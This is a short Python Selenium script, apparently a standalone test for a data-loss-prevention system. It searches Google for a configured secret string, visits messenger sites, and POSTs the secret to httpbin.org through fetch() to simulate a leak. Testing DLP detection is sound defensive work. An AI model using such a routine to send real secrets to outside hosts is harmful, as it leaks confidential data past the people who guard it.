import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import config

def log(msg): print(f"[QUICK-TEST] {msg}")

def run_standalone():
    log(">>> ЗАПУСК АВТОНОМНОГО ТЕСТА (Internet Only) <<<")
    
    # Настройка браузера
    opts = Options()
    opts.add_argument("--start-maximized")
    # opts.add_argument("--headless") # Раскомментить, если нужно без окна
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
    
    try:
        # 1. Поисковые запросы (HTTP/HTTPS)
        log("1. Генерация поисковых запросов (Google/Bing)...")
        driver.get(f"https://www.google.com/search?q={config.SECRET_DATA}")
        time.sleep(3)
        
        # 2. Мессенджеры (Web Versions)
        # Просто заходим, чтобы DLP увидел SSL handshake с доменами мессенджеров
        targets = [
            ("WhatsApp Web", "https://web.whatsapp.com"),
            ("Telegram Web", "https://web.telegram.org"),
            ("Skype Online", "https://web.skype.com"),
            ("LinkedIn", "https://www.linkedin.com")
        ]
        
        for name, url in targets:
            log(f"2. Проверка детекции приложения: {name}...")
            driver.get(url)
            time.sleep(5) # Даем время на загрузку скриптов
            
        # 3. HTTP POST (Утечка данных в публичный bin)
        log("3. Попытка отправки данных через HTTP POST...")
        # httpbin.org - публичный сервис для тестов
        driver.execute_script(f"""
            fetch('https://httpbin.org/post', {{
                method: 'POST',
                body: JSON.stringify({{ secret: '{config.SECRET_DATA}' }})
            }});
        """)
        time.sleep(2)
        log("   [OK] Данные отправлены.")

    except Exception as e:
        log(f"[ERROR] {e}")
    finally:
        driver.quit()
        log("Автономный тест завершен.")

if __name__ == "__main__":
    run_standalone()
